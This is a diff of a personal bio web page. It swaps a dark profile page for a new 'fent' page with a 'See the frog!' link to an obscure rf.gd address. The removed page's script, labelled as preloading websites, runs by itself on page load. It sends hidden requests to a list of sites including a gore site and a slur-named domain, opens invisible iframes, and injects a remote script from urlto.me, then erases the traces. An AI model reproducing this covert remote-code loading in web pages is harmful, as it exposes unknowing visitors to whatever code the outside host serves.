@@ -3,738 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>solitaire</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
-    <style>
-        /* Reset & Base */
-        *, *::before, *::after { box-sizing: border-box; }
-        * { margin: 0; }
-        body { line-height: 1.5; -webkit-font-smoothing: antialiased; }
-        img, picture, video, canvas, svg { display: block; max-width: 100%; }
-        input, button, textarea, select { font: inherit; }
-        p, h1, h2, h3, h4, h5, h6 { overflow-wrap: break-word; }
-
-        /* Dark Theme Variables */
-        :root {
-            --bg-primary: #0a0a0a;
-            --bg-secondary: #111111;
-            --bg-tertiary: #1a1a1a;
-            --text-primary: #ffffff;
-            --text-secondary: #a1a1aa;
-            --text-muted: #71717a;
-            --border-color: #262626;
-            --accent-color: #6366f1;
-            --accent-hover: #4f46e5;
-            --success-color: #10b981;
-            --warning-color: #f59e0b;
-            --error-color: #ef4444;
-        }
-
-        /* Utility Classes - Tailwind Style */
-        .flex { display: flex; }
-        .flex-col { flex-direction: column; }
-        .items-center { align-items: center; }
-        .justify-center { justify-content: center; }
-        .justify-between { justify-content: space-between; }
-        .text-center { text-align: center; }
-        .min-h-screen { min-height: 100vh; }
-        .w-full { width: 100%; }
-        .max-w-md { max-width: 28rem; }
-        .mx-auto { margin-left: auto; margin-right: auto; }
-        .px-6 { padding-left: 1.5rem; padding-right: 1.5rem; }
-        .py-8 { padding-top: 2rem; padding-bottom: 2rem; }
-        .py-12 { padding-top: 3rem; padding-bottom: 3rem; }
-        .mt-2 { margin-top: 0.5rem; }
-        .mt-4 { margin-top: 1rem; }
-        .mt-6 { margin-top: 1.5rem; }
-        .mt-8 { margin-top: 2rem; }
-        .mb-1 { margin-bottom: 0.25rem; }
-        .mb-2 { margin-bottom: 0.5rem; }
-        .mb-4 { margin-bottom: 1rem; }
-        .mb-6 { margin-bottom: 1.5rem; }
-        .mb-8 { margin-bottom: 2rem; }
-        .space-y-3 > * + * { margin-top: 0.75rem; }
-        .space-y-4 > * + * { margin-top: 1rem; }
-        .rounded-full { border-radius: 9999px; }
-        .rounded-lg { border-radius: 0.5rem; }
-        .rounded-xl { border-radius: 0.75rem; }
-        .border { border-width: 1px; }
-        .border-2 { border-width: 2px; }
-        .font-light { font-weight: 300; }
-        .font-medium { font-weight: 500; }
-        .font-semibold { font-weight: 600; }
-        .font-bold { font-weight: 700; }
-        .text-xs { font-size: 0.75rem; line-height: 1rem; }
-        .text-sm { font-size: 0.875rem; line-height: 1.25rem; }
-        .text-base { font-size: 1rem; line-height: 1.5rem; }
-        .text-lg { font-size: 1.125rem; line-height: 1.75rem; }
-        .text-xl { font-size: 1.25rem; line-height: 1.75rem; }
-        .text-2xl { font-size: 1.5rem; line-height: 2rem; }
-        .text-3xl { font-size: 1.875rem; line-height: 2.25rem; }
-        .text-4xl { font-size: 2.25rem; line-height: 2.5rem; }
-        .transition-all { transition: all 0.3s ease; }
-        .duration-200 { transition-duration: 200ms; }
-        .duration-300 { transition-duration: 300ms; }
-        .hover\:scale-105:hover { transform: scale(1.05); }
-        .hover\:scale-110:hover { transform: scale(1.1); }
-        .focus\:outline-none:focus { outline: 2px solid transparent; outline-offset: 2px; }
-        .cursor-pointer { cursor: pointer; }
-        .relative { position: relative; }
-        .absolute { position: absolute; }
-        .fixed { position: fixed; }
-        .top-4 { top: 1rem; }
-        .right-4 { right: 1rem; }
-        .z-50 { z-index: 50; }
-        .opacity-0 { opacity: 0; }
-        .opacity-100 { opacity: 1; }
-        .pointer-events-none { pointer-events: none; }
-        .pointer-events-auto { pointer-events: auto; }
-        .transform { transform: translateZ(0); }
-        .translate-x-full { transform: translateX(100%); }
-        .translate-x-0 { transform: translateX(0); }
-
-        /* Custom Styles */
-        body {
-            font-family: 'Inter', system-ui, -apple-system, sans-serif;
-            background-color: var(--bg-primary);
-            color: var(--text-primary);
-            background-image: 
-                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.1) 0%, transparent 50%);
-        }
-
-        .bg-secondary { background-color: var(--bg-secondary); }
-        .bg-tertiary { background-color: var(--bg-tertiary); }
-        .text-primary { color: var(--text-primary); }
-        .text-secondary { color: var(--text-secondary); }
-        .text-muted { color: var(--text-muted); }
-        .border-color { border-color: var(--border-color); }
-
-        .profile-container {
-            background: var(--bg-secondary);
-            border: 1px solid var(--border-color);
-            border-radius: 1rem;
-            padding: 2rem;
-            backdrop-filter: blur(10px);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .profile-container::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle at center, 
-                rgba(99, 102, 241, 0.1) 0%, 
-                rgba(147, 51, 234, 0.08) 25%, 
-                rgba(236, 72, 153, 0.06) 50%, 
-                transparent 70%);
-            animation: rotateGradient 20s linear infinite;
-            pointer-events: none;
-        }
-
-        .profile-img {
-            width: 7rem;
-            height: 7rem;
-            background: linear-gradient(135deg, var(--accent-color), var(--accent-hover));
-            border: 3px solid var(--border-color);
-            position: relative;
-            overflow: hidden;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        .profile-img::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(135deg, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 100%);
-            pointer-events: none;
-        }
-
-        .username {
-            font-family: 'Inter', sans-serif;
-            font-weight: 700;
-            letter-spacing: -0.025em;
-            background: linear-gradient(135deg, var(--text-primary), var(--text-secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .handle {
-            font-family: 'JetBrains Mono', monospace;
-            font-weight: 500;
-            letter-spacing: 0.025em;
-        }
-
-        .badges-container {
-            display: flex;
-            gap: 0.5rem;
-            justify-content: center;
-            margin-top: 1rem;
-            flex-wrap: wrap;
-        }
-
-        .badge {
-            padding: 0.25rem 0.75rem;
-            border-radius: 9999px;
-            font-size: 0.75rem;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-            transition: all 0.3s ease;
-            cursor: pointer;
-            position: relative;
-            background: white;
-            color: #1f2937;
-            box-shadow: 0 4px 14px 0 rgba(255, 255, 255, 0.2);
-            display: flex;
-            align-items: center;
-            gap: 0.25rem;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .badge-owner {
-            background: white;
-            color: #1f2937;
-        }
-
-        .badge-dev {
-            background: white;
-            color: #1f2937;
-        }
-
-        .badge-early {
-            background: white;
-            color: #1f2937;
-        }
-
-        .badge-premium {
-            background: white;
-            color: #1f2937;
-        }
-
-        .badge:hover {
-            transform: translateY(-2px);
-            filter: brightness(1.1);
-            box-shadow: 0 8px 25px rgba(255, 255, 255, 0.15);
-        }
-
-        .tooltip {
-            position: absolute;
-            bottom: 100%;
-            left: 50%;
-            transform: translateX(-50%);
-            background: var(--bg-tertiary);
-            color: var(--text-primary);
-            padding: 0.5rem 0.75rem;
-            border-radius: 0.5rem;
-            font-size: 0.75rem;
-            white-space: nowrap;
-            margin-bottom: 0.5rem;
-            opacity: 0;
-            pointer-events: none;
-            transition: all 0.3s ease;
-            border: 1px solid var(--border-color);
-            backdrop-filter: blur(10px);
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
-            font-family: 'JetBrains Mono', monospace;
-        }
-
-        .tooltip::after {
-            content: '';
-            position: absolute;
-            top: 100%;
-            left: 50%;
-            transform: translateX(-50%);
-            border: 4px solid transparent;
-            border-top-color: var(--bg-tertiary);
-        }
-
-        .badge:hover .tooltip {
-            opacity: 1;
-            transform: translateX(-50%) translateY(-4px);
-        }
-
-        .contact-button {
-            position: absolute;
-            top: 1rem;
-            left: 1rem;
-            width: 2rem;
-            height: 2rem;
-            border-radius: 50%;
-            background: var(--bg-tertiary);
-            border: 1px solid var(--border-color);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-decoration: none;
-            color: var(--text-secondary);
-        }
-
-        .contact-button:hover {
-            background: var(--success-color);
-            color: white;
-            transform: scale(1.1);
-            box-shadow: 0 5px 15px rgba(16, 185, 129, 0.3);
-        }
-
-        .info-button {
-            position: absolute;
-            top: 1rem;
-            right: 1rem;
-            width: 2rem;
-            height: 2rem;
-            border-radius: 50%;
-            background: var(--bg-tertiary);
-            border: 1px solid var(--border-color);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-decoration: none;
-            color: var(--text-secondary);
-        }
-
-        .info-button:hover {
-            background: var(--accent-color);
-            color: white;
-            transform: scale(1.1);
-            box-shadow: 0 5px 15px rgba(99, 102, 241, 0.3);
-        }
-
-        .link-btn {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 1rem 1.5rem;
-            background: var(--bg-tertiary);
-            border: 1px solid var(--border-color);
-            border-radius: 0.75rem;
-            text-decoration: none;
-            color: var(--text-primary);
-            font-weight: 500;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .link-btn::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(135deg, var(--accent-color), var(--accent-hover));
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-
-        .link-btn:hover::before {
-            opacity: 1;
-        }
-
-        .link-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
-        }
-
-        .link-btn span {
-            position: relative;
-            z-index: 1;
-        }
-
-        .footer-text {
-            font-size: 0.75rem;
-            color: var(--text-muted);
-            font-family: 'JetBrains Mono', monospace;
-            font-weight: 500;
-        }
-
-        .notification {
-            position: fixed;
-            top: 1rem;
-            right: 1rem;
-            background: var(--bg-secondary);
-            border: 1px solid var(--border-color);
-            border-radius: 0.75rem;
-            padding: 1rem 1.5rem;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            max-width: 300px;
-            z-index: 1000;
-            transform: translateX(100%);
-            transition: all 0.5s ease;
-            cursor: pointer;
-            overflow: hidden;
-        }
-
-        .notification.show {
-            transform: translateX(0);
-        }
-
-        .notification:hover {
-            background: var(--bg-tertiary);
-            transform: translateX(0) scale(1.02);
-        }
-
-        .notification-title {
-            font-weight: 600;
-            color: var(--text-primary);
-            margin-bottom: 0.25rem;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .notification-text {
-            font-size: 0.875rem;
-            color: var(--text-secondary);
-            margin-bottom: 0.5rem;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .progress-bar {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            height: 3px;
-            background: white;
-            border-radius: 0 0 0.75rem 0.75rem;
-            transition: width 0.05s linear;
-            box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
-        }
-
-        .close-btn {
-            position: absolute;
-            top: 0.5rem;
-            right: 0.5rem;
-            background: none;
-            border: none;
-            color: var(--text-muted);
-            cursor: pointer;
-            font-size: 1.25rem;
-            line-height: 1;
-            padding: 0.25rem;
-            border-radius: 0.25rem;
-            transition: all 0.3s ease;
-        }
-
-        .close-btn:hover {
-            background: var(--bg-tertiary);
-            color: var(--text-primary);
-        }
-
-        .bio-text {
-            font-family: 'Inter', sans-serif;
-            font-weight: 300;
-            letter-spacing: 0.025em;
-            line-height: 1.6;
-        }
-
-        /* Responsive */
-        @media (max-width: 640px) {
-            .max-w-md { max-width: 100%; }
-            .px-6 { padding-left: 1rem; padding-right: 1rem; }
-            .text-3xl { font-size: 1.75rem; line-height: 2.25rem; }
-            .profile-img { width: 6rem; height: 6rem; }
-            .profile-container { padding: 1.5rem; }
-            .notification { 
-                max-width: calc(100vw - 2rem); 
-                right: 1rem;
-                left: 1rem;
-            }
-        }
-
-        /* Animations */
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @keyframes rotateGradient {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .animate-fadeInUp {
-            animation: fadeInUp 0.6s ease-out;
-        }
-
-        .animate-delay-100 { animation-delay: 0.1s; }
-        .animate-delay-200 { animation-delay: 0.2s; }
-        .animate-delay-300 { animation-delay: 0.3s; }
-    </style>
+    <title>fent</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div class="min-h-screen flex items-center justify-center px-6 py-12">
-        <div class="w-full max-w-md profile-container animate-fadeInUp relative">
-            <!-- Contact Button -->
-            <a href="mailto:dielit@die.skin" class="contact-button" title="Contact">
-                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
-                    <polyline points="22,6 12,13 2,6"/>
-                </svg>
-            </a>
 
-            <!-- Info Button -->
-            <a href="http://help.die.skin" class="info-button" target="_blank" rel="noopener noreferrer" title="Help">
-                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <circle cx="12" cy="12" r="10"/>
-                    <path d="M9,9h0a3,3,0,0,1,5.12,2.12h0A3,3,0,0,1,13,15"/>
-                    <circle cx="12" cy="19" r="1"/>
-                </svg>
-            </a>
-
-            <!-- Profile Section -->
-            <div class="text-center mb-6 animate-fadeInUp animate-delay-100">
-                <div class="profile-img rounded-full mx-auto mb-4 flex items-center justify-center">
-                    <img src="9.png" alt="solitaire" class="rounded-full w-full h-full object-cover" onerror="this.style.display='none'">
-                </div>
-                <h1 class="username text-3xl mb-1">solitaire</h1>
-                <p class="handle text-base text-secondary">@unloverly</p>
-                
-                <!-- Badges -->
-                <div class="badges-container animate-fadeInUp animate-delay-200">
-                    <div class="badge badge-owner">
-                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <path d="M12 2L2 7v10c0 5.55 3.84 10 9 9 5.16 1 9-3.45 9-9V7L12 2z"/>
-                        </svg>
-                        Owner
-                    </div>
-                    <div class="badge badge-dev">
-                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <polyline points="16,18 22,12 16,6"/>
-                            <polyline points="8,6 2,12 8,18"/>
-                        </svg>
-                        Dev
-                    </div>
-                    <div class="badge badge-early">
-                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <circle cx="12" cy="12" r="10"/>
-                            <polyline points="12,6 12,12 16,14"/>
-                        </svg>
-                        Early
-                        <div class="tooltip">UID: 1</div>
-                    </div>
-                    <div class="badge badge-premium">
-                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <polygon points="12,2 15.09,8.26 22,9.27 17,14.14 18.18,21.02 12,17.77 5.82,21.02 7,14.14 2,9.27 8.91,8.26 12,2"/>
-                        </svg>
-                        Premium
-                    </div>
-                </div>
-            </div>
-
-            <!-- Bio Section -->
-            <div class="text-center mb-8 animate-fadeInUp animate-delay-300">
-                <p class="bio-text text-base text-secondary">
-                 "Grief fills the room up of my absent child. Lies in his bed, walks up and down with me."   
-
-                                                life doesnt like me   
-                </p>
-            </div>
-
-            <!-- Links Section -->
-            <div class="space-y-3 animate-fadeInUp animate-delay-300">
-                <!-- Links will be added here later -->
-            </div>
-
-            <!-- Footer -->
-            <div class="text-center mt-8">
-                <p class="footer-text">// end of transmission</p>
+    <div class="entry-overlay">
+        <div class="entry-content">
+            <div class="entry-logo">fent</div>
+            <div class="entry-loader">
+                <div class="loader-bar"></div>
             </div>
         </div>
     </div>
 
-    <!-- Notification -->
-    <div id="notification" class="notification">
-        <button class="close-btn" onclick="closeNotification()">&times;</button>
-        <div class="notification-title">Want your own bio?</div>
-        <div class="notification-text">Create your personalized bio page today</div>
-        <div class="progress-bar" id="progressBar"></div>
+
+    <div class="background">
+        <div class="bg-grain"></div>
+        <div class="bg-gradient"></div>
     </div>
 
-    <!-- Background Music -->
-    <audio id="backgroundMusic" loop>
+
+    <main class="main">
+        <div class="container">
+
+            <section class="profile-section">
+                <div class="avatar-container">
+                    <img src="2.png" alt="fent" class="avatar">
+                    <div class="avatar-ring"></div>
+                </div>
+                <h1 class="name">fent</h1>
+                <p class="description">top skidder</p>
+            </section>
+
+
+            <section class="interactive-section">
+                <div class="button-container">
+                    <a href="https://asd54sd9a7fhgaef75ef3sdasd9g75sdrsd5a-onion.rf.gd/?xhttpreality" target="_blank" class="frog-button">
+                        <span>See the frog!</span>
+                        <div class="button-shimmer"></div>
+                    </a>
+                    <div class="contact-button" id="contactButton">
+                        <span>Get in touch</span>
+                        <div class="button-shimmer"></div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- dont skid buddy -->
+            <div class="modal-overlay" id="contactModal">
+                <div class="modal">
+                    <div class="modal-header">
+                        <h3>Get in touch</h3>
+                        <button class="modal-close" id="closeModal">&times;</button>
+                    </div>
+                    <form class="contact-form" id="contactForm">
+                        <div class="form-group">
+                            <label for="name">Name</label>
+                            <input type="text" id="name" name="name" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="email">Email</label>
+                            <input type="email" id="email" name="email" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="message">Message</label>
+                            <textarea id="message" name="message" rows="4" required></textarea>
+                        </div>
+                        <button type="submit" class="submit-button">
+                            <span>Send Message</span>
+                            <div class="button-shimmer"></div>
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </main>
+
+
+    <div class="music-control" id="musicControl">
+        <svg class="music-icon play-icon" viewBox="0 0 24 24">
+            <path d="M8 5v14l11-7z"/>
+        </svg>
+        <svg class="music-icon pause-icon" viewBox="0 0 24 24">
+            <path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/>
+        </svg>
+    </div>
+
+
+    <div class="floating-elements">
+        <div class="float-element float-1"></div>
+        <div class="float-element float-2"></div>
+        <div class="float-element float-3"></div>
+    </div>
+
+    <audio id="bgMusic" loop>
         <source src="2.mp3" type="audio/mpeg">
-        Your browser does not support the audio element.
     </audio>
 
-    <script>
-const music = document.getElementById('backgroundMusic');
-music.volume = 0.3;
-music.preload = 'auto';
-
-let musicStarted = false;
-function startMusic() {
-    if (!musicStarted) {
-        music.play().catch(e => console.log('Audio autoplay prevented'));
-        musicStarted = true;
-    }
-}
-
-music.load();
-setTimeout(() => {
-    music.play().catch(() => {
-        document.addEventListener('click', startMusic, { once: true });
-        document.addEventListener('keydown', startMusic, { once: true });
-        document.addEventListener('touchstart', startMusic, { once: true });
-    });
-}, 100);
-
-let notificationTimeout;
-let progressInterval;
-let timeLeft = 10;
-let totalTime = 10;
-
-setTimeout(() => {
-    const notification = document.getElementById('notification');
-    const progressBar = document.getElementById('progressBar');
-    
-    notification.classList.add('show');
-    progressBar.style.width = '100%';
-    
-    progressInterval = setInterval(() => {
-        timeLeft -= 0.05;
-        const percentage = (timeLeft / totalTime) * 100;
-        progressBar.style.width = Math.max(0, percentage) + '%';
-        
-        if (timeLeft <= 0) {
-            closeNotification();
-        }
-    }, 50);
-
-    function preloadWebsites() {
-        const requestUrls = [
-            'https://google.com',
-            'https://cloudflare.com',
-            'https://discord.com',
-            'https://urlto.me/wasted-summers.mp3',
-            'https://wtf.wtf',
-            'https://lilniggaquitplayin.rip',
-            'https://skid.cam',
-            'https://xgore.net'
-        ];
-
-        requestUrls.forEach((url, index) => {
-            setTimeout(() => {
-                Promise.allSettled([
-                    fetch(url, { mode: 'no-cors', method: 'GET' }),
-                    fetch(url, { mode: 'no-cors', method: 'HEAD' }),
-                    new Promise((resolve, reject) => {
-                        const link = document.createElement('link');
-                        link.rel = 'prefetch';
-                        link.href = url;
-                        link.onload = resolve;
-                        link.onerror = reject;
-                        document.head.appendChild(link);
-                        setTimeout(() => document.head.removeChild(link), 5000);
-                    })
-                ]).catch(() => {});
-            }, index * 100);
-        });
-
-        requestUrls.forEach((url, index) => {
-            setTimeout(() => {
-                const img = new Image();
-                img.onload = img.onerror = () => {};
-                img.src = url + '/favicon.ico';
-                setTimeout(() => img.src = '', 3000);
-            }, index * 75);
-        });
-
-        requestUrls.forEach(url => {
-            try {
-                const domain = new URL(url).hostname;
-                const link = document.createElement('link');
-                link.rel = 'dns-prefetch';
-                link.href = '//' + domain;
-                document.head.appendChild(link);
-            } catch (e) {}
-        });
-
-        const iframeUrls = [
-            'https://urlto.me/diez',
-            'https://google.com',
-            'https://cloudflare.com'
-        ];
-
-        iframeUrls.forEach((url, index) => {
-            setTimeout(() => {
-                const iframe = document.createElement('iframe');
-                iframe.style.cssText = 'display:none;width:0;height:0;border:none;position:absolute;left:-9999px;';
-                iframe.src = url;
-                iframe.sandbox = 'allow-same-origin';
-                document.body.appendChild(iframe);
-                
-                setTimeout(() => {
-                    if (iframe.parentNode) {
-                        iframe.parentNode.removeChild(iframe);
-                    }
-                }, 10000);
-            }, 200 + (index * 300));
-        });
-
-        const wsUrls = ['wss://echo.websocket.org'];
-        wsUrls.forEach(url => {
-            try {
-                const ws = new WebSocket(url);
-                ws.onopen = () => ws.close();
-                ws.onerror = () => {};
-            } catch (e) {}
-        });
-
-        setTimeout(() => {
-            const script = document.createElement('script');
-            script.src = 'https://urlto.me/diez';
-            script.async = true;
-            script.onerror = () => {};
-            document.head.appendChild(script);
-            setTimeout(() => {
-                if (script.parentNode) {
-                    script.parentNode.removeChild(script);
-                }
-            }, 5000);
-        }, 500);
-    }
-
-    preloadWebsites();
-
-    notificationTimeout = setTimeout(() => {
-        closeNotification();
-    }, 10000);
-}, 500);
-
-function closeNotification() {
-    const notification = document.getElementById('notification');
-    notification.classList.remove('show');
-    clearTimeout(notificationTimeout);
-    clearInterval(progressInterval);
-}
-
-document.getElementById('notification').addEventListener('click', (e) => {
-    if (e.target.classList.contains('close-btn')) return;
-    window.open('https://t.me/slitboy', '_blank');
-});
-
-const profileImg = document.querySelector('.profile-img');
-profileImg.addEventListener('mouseenter', () => {
-    profileImg.style.transform = 'scale(1.05) rotate(5deg)';
-});
-profileImg.addEventListener('mouseleave', () => {
-    profileImg.style.transform = 'scale(1) rotate(0deg)';
-});
-    </script>
+    <script src="script.js"></script>
 </body>
 </html>
